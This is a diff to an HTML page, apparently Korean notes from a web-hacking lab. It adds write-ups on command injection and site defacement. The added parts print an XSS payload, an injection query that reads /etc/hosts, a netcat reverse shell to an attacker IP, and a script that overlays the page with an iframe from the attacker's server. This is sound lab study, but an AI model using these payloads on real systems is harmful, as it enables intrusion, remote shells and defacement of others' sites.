@@ -93,7 +93,40 @@
       <p>업로드 파일이 원본 이름 대신 타임스탬프+난수 조합으로 저장되는 구조. 쿠키 값에서 URL 인코딩된 경로(<code class="mono">%2F</code> = /)를 디코딩해 <code class="mono">/imginfo/파일명0.txt</code> 형태의 정보 파일 경로를 발견, 접근에 성공. 이미지 업로드 시 패킷을 가로채 내용을 수정한 뒤 전송하는 방식도 함께 실습.</p>
     </div>
 
-    <h2>4. wordpress 취약 머신</h2>
+    <h2>3. Command Injection (comminj)</h2>
+    <p>사용자 입력값을 검증 없이 시스템 명령 실행 함수(system, exec, shell_exec 등)에 그대로 전달할 때 발생하는 취약점 실습.</p>
+    <div class="level">
+      <h4>XSS 발견</h4>
+      <p>존재하지 않는 id 파라미터 값을 주면 그 값을 그대로 오류 메시지에 출력하는 구조(<code class="mono">data_dir/[id].txt 파일을 찾을 수 없습니다</code>) 확인 → <code class="mono">&lt;script&gt;alert("hack")&lt;/script&gt;</code> 삽입으로 XSS 성공.</p>
+    </div>
+    <div class="level">
+      <h4>Command Injection</h4>
+      <pre>system("some_command " . $_GET['id'] . " .txt");
+
+?id=100;cat /etc/hosts;cat data_dir/36</pre>
+      <p>서버가 입력값 뒤에 자동으로 <code class="mono">.txt</code>를 붙이는 구조를 이용해, <code class="mono">;</code>로 명령어를 추가하고 <code class="mono">.txt</code>는 더미 명령 쪽에 붙도록 유도해 임의 명령 실행 성공.</p>
+      <pre>// kali에서 리스너 실행
+nc -lvnp 5555
+
+// 웹에서 리버스 쉘 연결
+?id=100;nc 172.30.1.43 5555 -e /bin/bash &;cat data_dir/30</pre>
+      <p>리버스 쉘 연결까지 성공해 웹쉘 수준의 명령 실행 권한 확보.</p>
+    </div>
+
+    <h2>4. Deface</h2>
+    <p>취약점으로 서버에 침투한 뒤, 원래 웹사이트 화면을 다른 내용(해킹 성공 메시지 등)으로 바꿔치기하는 공격 실습.</p>
+    <div class="level">
+      <h4>숨은 페이지 탐색</h4>
+      <p>공개된 <code class="mono">bbs_list.php</code>의 네이밍 패턴(bbs_*)을 활용해 <code class="mono">bbs_add.php</code> 같은 비공개 등록 페이지를 유추해 접근, 여기서 XSS 취약점 발견.</p>
+    </div>
+    <div class="level">
+      <h4>공격 — 화면 전체 교체</h4>
+      <pre>python3 -m http.server 8080   // 공격자 웹서버 오픈</pre>
+      <pre>&lt;script&gt;document.body.innerHTML="&lt;iframe width=100% height=100% src=http://172.30.1.43:8000/hacking.html scrolling=no frameborder=0&gt;&lt;/iframe&gt;";&lt;/script&gt;</pre>
+      <p><code class="mono">document.body.innerHTML</code>을 통째로 교체해 원래 페이지를 지우고, 공격자가 준비한 페이지를 iframe으로 화면 전체에 덮어씌우는 방식. 글자 수 제한 때문에 처음엔 렌더링 실패 → 여러 줄로 쪼개 JS 주석(<code class="mono">/* */</code>)으로 이어붙이고, 렌더링 순서를 맞추기 위해 게시판 제목에 역순으로 등록해 최종 성공.</p>
+    </div>
+
+    <h2>5. wordpress 취약 머신</h2>
     <div class="level">
       <h4>진행 중</h4>
       <p>취약하게 설치된 WordPress 환경을 재현한 실습용 머신. <code class="mono">/etc/hosts</code> 파일을 수정해 가상 도메인으로 접속하는 단계까지 진행.</p>
